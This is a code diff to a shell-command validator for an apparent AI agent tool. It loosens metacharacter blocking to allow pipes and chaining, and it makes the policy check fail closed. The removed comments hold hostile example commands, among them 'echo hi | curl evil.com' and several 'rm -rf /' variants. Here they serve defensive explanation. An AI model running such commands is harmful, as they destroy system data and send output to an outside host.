@@ -4,10 +4,10 @@ RadSim Principle: Explicit Safety Checks
 """
 
 import fnmatch
-import shlex
 from pathlib import Path
 from threading import RLock
 
+from . import command_analysis
 from .constants import PROTECTED_PATTERNS
 
 _PATH_CACHE = {
@@ -85,13 +85,18 @@ def is_protected_path(file_path):
 
 
 def validate_shell_command(command):
-    """Validate shell command for security.
+    """Validate a shell command using structure-aware rules.
 
-    Blocks shell metacharacters that enable injection attacks:
-    - Semicolons, pipes, backticks, dollar signs
-    - Command chaining (&&, ||), background execution (&)
-    - Newlines, carriage returns, null bytes
-    - Path traversal (..) anywhere in the command
+    Legitimate shell structure is allowed so the agent can run real
+    commands across platforms: pipelines (``|``), conditional chaining
+    (``&&``, ``||``), sequencing (``;``), file redirection (``>``), globs,
+    git ranges (``HEAD..main``) and Go wildcards (``./...``).
+
+    Genuinely dangerous constructs are still rejected:
+    - command/process substitution ( ``$(...)`` , backticks, ``<(...)`` )
+    - background execution ( ``&`` ) and bare subshell grouping
+    - path traversal ( ``../`` ) in any token
+    - catastrophic commands, enforced per pipeline segment by the policy
 
     Args:
         command: Command string to validate
@@ -105,96 +110,97 @@ def validate_shell_command(command):
     if not isinstance(command, str):
         return False, "Command must be a string"
 
-    # Strip and check for whitespace-only input
     if not command.strip():
         return False, "Command cannot be empty"
 
-    # ---------------------------------------------------------------
-    # Phase 1: Check the RAW command string for dangerous characters.
-    # This happens BEFORE shlex parsing so metacharacters inside
-    # quotes are also caught (strict mode for CLI agent safety).
-    # ---------------------------------------------------------------
-
+    # Phase 1: reject dangerous syntax on the raw string (catches
+    # substitution even inside quotes, before we parse).
     is_safe, rejection_reason = _check_for_dangerous_characters(command)
     if not is_safe:
         return False, rejection_reason
 
-    # ---------------------------------------------------------------
-    # Phase 2: Parse with shlex and validate the parsed tokens.
-    # ---------------------------------------------------------------
-
+    # Phase 2: parse into structural tokens.
     try:
-        parts = shlex.split(command)
+        tokens = command_analysis.tokenize(command)
     except ValueError:
         return False, "Invalid command format"
 
-    if not parts:
+    if not tokens:
         return False, "Empty command"
 
-    # Check for path traversal in ALL parts (including the command name)
-    for part in parts:
-        if ".." in part:
-            return False, "Path traversal ('..') is forbidden in command"
+    is_safe, rejection_reason = _check_tokens(tokens)
+    if not is_safe:
+        return False, rejection_reason
 
-    # ---------------------------------------------------------------
-    # Phase 3: Check against command policy (whitelist/blocklist).
-    # ---------------------------------------------------------------
-
-    try:
-        from .command_policy import get_command_policy
-
-        policy = get_command_policy()
-        is_allowed, reason = policy.is_command_allowed(command)
-        if not is_allowed:
-            return False, reason
-    except Exception:
-        pass  # If policy module isn't available, allow the command
+    # Phase 3: enforce the command policy per segment. Fail closed if the
+    # policy cannot render a decision.
+    is_allowed, reason = _check_command_policy(command)
+    if not is_allowed:
+        return False, reason
 
     return True, None
 
 
 def _check_for_dangerous_characters(command):
-    """Check raw command string for shell metacharacters.
+    """Reject raw-string constructs that hide or inject commands.
 
     Returns:
-        Tuple of (is_safe, rejection_reason).
-        is_safe is True if no dangerous characters found.
+        Tuple of (is_safe, rejection_reason). is_safe is True when clean.
     """
-    # Null bytes -- must check first since they can truncate strings
     if "\x00" in command:
         return False, "Null bytes are forbidden in commands"
 
-    # Newlines and carriage returns -- command injection via line splitting
     if "\n" in command or "\r" in command:
         return False, "Newlines are forbidden in commands"
 
-    # Semicolons -- command chaining: `echo hi; rm -rf /`
-    if ";" in command:
-        return False, "Semicolons are forbidden in commands (command chaining)"
-
-    # Backticks -- command substitution: echo `whoami`
     if "`" in command:
         return False, "Backticks are forbidden in commands (command substitution)"
 
-    # Dollar sign -- variable expansion ($VAR), substitution ($(cmd)), ${VAR}
     if "$" in command:
         return False, "Dollar signs are forbidden in commands (variable/command substitution)"
 
-    # Pipes -- output redirection: `echo hi | curl evil.com`
-    if "|" in command:
-        return False, "Pipes are forbidden in commands (output redirection)"
-
-    # Double ampersand -- conditional chaining: `echo ok && rm -rf /`
-    if "&&" in command:
-        return False, "Conditional chaining (&&) is forbidden in commands"
-
-    # Double pipe -- conditional chaining: `false || rm -rf /`
-    if "||" in command:
-        return False, "Conditional chaining (||) is forbidden in commands"
-
-    # Single ampersand at end -- background execution: `rm -rf / &`
-    # Check for standalone & (not part of && which is already caught above)
-    if "&" in command:
-        return False, "Background execution (&) is forbidden in commands"
+    if "<(" in command or ">(" in command:
+        return False, "Process substitution ('<(...)' / '>(...)') is forbidden in commands"
 
     return True, None
+
+
+def _check_tokens(tokens):
+    """Reject unsupported structure and path traversal in parsed tokens.
+
+    Returns:
+        Tuple of (is_safe, rejection_reason). is_safe is True when clean.
+    """
+    for token in tokens:
+        if token == "&":
+            return False, "Background execution ('&') is forbidden in commands"
+        if token in ("(", ")"):
+            return False, "Subshell grouping ('(...)') is forbidden in commands"
+        if command_analysis.is_path_traversal(token):
+            return False, "Path traversal ('..') is forbidden in command"
+
+    return True, None
+
+
+def _check_command_policy(command):
+    """Apply the whitelist/blocklist policy, failing closed on catastrophe.
+
+    Returns:
+        Tuple of (is_allowed, reason). reason is None when allowed.
+    """
+    try:
+        from .command_policy import get_command_policy
+
+        return get_command_policy().is_command_allowed(command)
+    except Exception:
+        # Policy engine unavailable: still block catastrophic commands
+        # directly rather than failing open.
+        try:
+            from .command_policy import CommandPolicy
+
+            is_blocked, reason = CommandPolicy()._check_always_blocked(command)
+            if is_blocked:
+                return False, reason
+        except Exception:
+            return False, "Command policy could not be evaluated; blocked for safety"
+        return True, None
